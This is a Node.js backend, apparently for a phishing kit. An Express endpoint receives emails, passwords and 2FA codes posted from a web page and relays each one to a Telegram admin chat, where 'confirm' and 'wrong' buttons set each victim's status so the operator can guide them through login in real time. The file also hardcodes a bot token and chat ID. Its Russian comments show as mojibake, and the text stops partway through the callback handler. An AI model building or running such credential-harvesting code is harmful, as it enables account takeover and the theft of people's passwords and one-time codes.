const TelegramBot = require('node-telegram-bot-api');

const express = require('express');

const cors = require('cors');



// --- –ù–ê–°–¢–†–û–ô–ö–ò ---

const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; 

const adminChatId = '-1003894478662'; 

// -----------------



const bot = new TelegramBot(token, { polling: true });

const app = express();



app.use(cors());

app.use(express.json());



let userStatuses = {}; 



// 1. –ü—Ä–∏–µ–º –¥–∞–Ω–Ω—ã—Ö —Å —Å–∞–π—Ç–∞

app.post('/send-data', (req, res) => {

    const { type, email, pass, code, userId } = req.body;

    

    userStatuses[userId] = 'pending';

    console.log(`[${userId}] –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å: ${type}`);



    let message = '';

    if (type === 'auth') {

        message = `‚ö†Ô∏è **–í—Ö–æ–¥**\nüë§ ID: \`${email}\`\nüîë Pass: \`${pass}\``;

    } else if (type === '2fa') {

        message = `üî¢ **–ö–æ–¥ 2FA**: \`${code}\``;

    } else {

        message = `‚ÑπÔ∏è –ò–Ω—Ñ–æ: ${req.body.text || '–Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}`;

    }



    bot.sendMessage(adminChatId, message, {

        parse_mode: 'Markdown',

        reply_markup: {

            inline_keyboard: [[

                { text: '‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å', callback_data: `ok_${userId}` },

                { text: '‚ùå –ù–µ–≤–µ—Ä–Ω–æ', callback_data: `err_${userId}` }

            ]]

        }

    });



    res.json({ status: 'ok' });

});



// 2. –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫ –≤ Telegram

bot.on('callback_query', (query) => {

    const data = query.data.split('_');

    const action = data[0]; 

    const userId = data[1];



    if (action === 'ok') {

        userStatuses[userId] = 'success';

        console.log(`[${userId}] –ê–¥–º–∏–Ω –Ω–∞–∂–∞–ª: ‚úÖ`);

    } else {

        userStatuses[userId] = 'error';

        console.log(`[${userId}] –ê–¥–º–∏–Ω –Ω–∞–∂–∞–ª: ‚ùå`);

    }



    bot.answerCallbackQuery(query.id, { text: "–°—Ç–∞—Ç—É—Å –æ–±–Ω–æ–≤–ª–µ–Ω" });

    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {

        chat_id: query.message.chat.id,

        message_id: query.message.message_id

    });


